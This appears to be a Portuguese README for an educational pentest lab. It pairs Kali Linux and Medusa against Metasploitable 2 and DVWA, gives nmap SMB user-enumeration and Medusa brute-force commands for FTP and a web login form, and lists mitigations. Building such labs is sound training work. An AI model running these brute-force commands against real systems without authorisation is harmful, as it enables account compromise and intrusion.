# MedusaBruteForce-Lab-README.md
Projeto prático de auditoria de segurança: lab completo com Kali + Medusa para ataques brute force em serviços vulneráveis (FTP, DVWA, SMB). Inclui setup VMs, scripts, documentação e defesas. Link: github.com/SEUUSER/MedusaBruteForce-Lab


# MedusaBruteForce-Lab 🛡️

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Kali Linux](https://img.shields.io/badge/Kali_Linux-2024.x-blue?logo=kali-linux)](https://kali.org)

**MedusaBruteForce-Lab** é um laboratório educacional open source para simular ataques de força bruta com **Medusa** em **Kali Linux** contra **Metasploitable 2** e **DVWA**. Documenta cenários reais de pentest ético, com wordlists, comandos e mitigação.

## 🎯 O que você vai aprender
- Configurar VMs isoladas no VirtualBox.
- Ataques brute force em FTP, Web Forms (DVWA) e SMB.
- Enumeração de usuários com Nmap.
- Medidas de defesa (fail2ban, políticas de senha).

## 🚀 Instalação Rápida

1. **Baixe as VMs**:
   - [Kali Linux](https://www.kali.org/get-kali/)
   - [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)

2. **Configure rede Host-Only** (IPs: Kali=192.168.56.10, Target=192.168.56.20)

3. **Execute ataques** (veja [Guia Completo](#guia-de-ataques))

## 📸 Demonstrações

### 1. Enumeração SMB
```bash
nmap -p 445 --script smb-enum-users 192.168.56.20
```
![SMB Enum](images/smb-enum.png)

**Saída esperada**: Usuários `msfadmin`, `user`.

### 2. FTP Brute Force (Medusa)
```bash
medusa -h 192.168.56.20 -u users.txt -P passwords.txt -M ftp
```
![FTP Success](images/ftp-success.png)

### 3. DVWA Web Form
```bash
medusa -h 192.168.56.20 -u admin -P passwords.txt -M http -m DIR:/DVWA/vulnerabilities/brute/ -T 10
```
![DVWA Success](images/dvwa-success.png)

## 🛡️ Medidas de Mitigação
- **Fail2Ban**: Bloqueia IPs após 5 falhas.
- **Senhas fortes**: Mínimo 12 chars, complexidade.
- **2FA**: Em todos os serviços.
- **Rate Limiting**: Nginx/Apache.

## Estrutura do Projeto
